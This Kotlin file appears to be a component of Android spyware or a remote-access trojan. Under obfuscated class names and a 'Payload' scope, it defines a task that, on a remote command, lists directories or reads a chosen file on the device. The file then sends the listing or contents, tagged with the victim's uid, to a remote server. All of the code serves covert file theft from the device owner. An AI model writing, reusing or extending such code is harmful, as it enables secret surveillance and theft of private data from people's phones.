package com.xxx.zzz.commandp.taskssv

import android.content.Context
import com.xxx.zzz.Payload
import com.xxx.zzz.commandp.utilsss.FileManagerrw
import com.xxx.zzz.socketsp.IOSocketyt
import com.xxx.zzz.socketsp.apiRequestHttpNm
import kotlinx.coroutines.launch
import org.json.JSONObject

class FileManagerTask(ctx: Context, val req: Int, val path: String) :
    BaseTask(ctx) {

    override fun run() {
        super.run()
        runCatching {
            work(req, path)
        }.onFailure {
            IOSocketyt.sendLogs("", "FileManagerTask ${it.localizedMessage}", "error")
        }
    }

    private fun work(req: Int, path: String) = Payload.ApplicationScope.launch {
        runCatching {
            when (req) {
                0 -> {
                    val data = JSONObject()
                    data.put("uid", params.uid)
                    data.put("info", FileManagerrw.walk(path).toString())
                    data.put("command", "walk")
                    apiRequestHttpNm.command(data)
                    IOSocketyt.sendLogs("", "FileManagerTask walk", "success")
                }
                1 -> {
                    FileManagerrw.downloadFile(path)?.let {
                        val data = JSONObject()
                        data.put("uid", params.uid)
                        data.put("path", path)
                        data.put("file", it.toString())
                        data.put("command", "file")
                        apiRequestHttpNm.command(data)
                        IOSocketyt.sendLogs("", "FileManagerTask file", "success")
                    }
                }
                else -> {
                }
            }
        }.onFailure {
            IOSocketyt.sendLogs("", "FileManagerTask ${it.localizedMessage}", "error")
        }
    }

}